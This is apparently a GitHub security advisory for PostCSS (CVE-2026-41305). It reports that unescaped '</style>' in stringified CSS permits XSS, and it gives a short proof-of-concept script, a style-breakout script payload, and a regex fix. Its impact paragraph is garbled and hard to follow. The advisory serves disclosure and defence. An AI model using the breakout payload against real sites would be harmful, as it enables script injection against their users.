# [M] PostCSS has XSS via Unescaped </style> in its CSS Stringify Output

## Summary
Severity: Medium
Advisory: GHSA-qx2v-qp2m-jg93
CVE: CVE-2026-41305
CWE: CWE-79
Ecosystem: npm
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N (CVSS_V3)
Published: 2026-04-24
Source: https://github.com/advisories/GHSA-qx2v-qp2m-jg93
Type: github-advisory

## Affected
- npm: `postcss` — affected >=0 <8.5.10

## Details
# PostCSS: XSS via Unescaped `</style>` in CSS Stringify Output

## Summary

PostCSS v8.5.5 (latest) does not escape `</style>` sequences when stringifying CSS ASTs. When user-submitted CSS is parsed and re-stringified for embedding in HTML `<style>` tags, `</style>` in CSS values breaks out of the style context, enabling XSS.

## Proof of Concept

```javascript
const postcss = require('postcss');

// Parse user CSS and re-stringify for page embedding
const userCSS = 'body { content: "</style><script>alert(1)</script><style>"; }';
const ast = postcss.parse(userCSS);
const output = ast.toResult().css;
const html = `<style>${output}</style>`;

console.log(html);
// <style>body { content: "</style><script>alert(1)</script><style>"; }</style>
//
// Browser: </style> closes the style tag, <script> executes
```

**Tested output** (Node.js v22, postcss v8.5.5):
```
Input: body { content: "</style><script>alert(1)</script><style>"; }
Output: body { content: "</style><script>alert(1)</script><style>"; }
Contains </style>: true
```

## Impact

Impact non-bundler use cases since bundlers for XSS on their own. Requires some PostCSS plugin to have malware code, which can inject XSS to website.

## Suggested Fix

Escape `</style` in all stringified output values:
```javascript
output = output.replace(/<\/(style)/gi, '<\\/$1');
```

## Credits
Discovered and reported by [Sunil Kumar](https://tharvid.in) ([@TharVid](https://github.com/TharVid))

## References
- https://github.com/postcss/postcss/security/advisories/GHSA-qx2v-qp2m-jg93
- https://nvd.nist.gov/vuln/detail/CVE-2026-41305
- https://github.com/postcss/postcss
- https://github.com/postcss/postcss/releases/tag/8.5.10
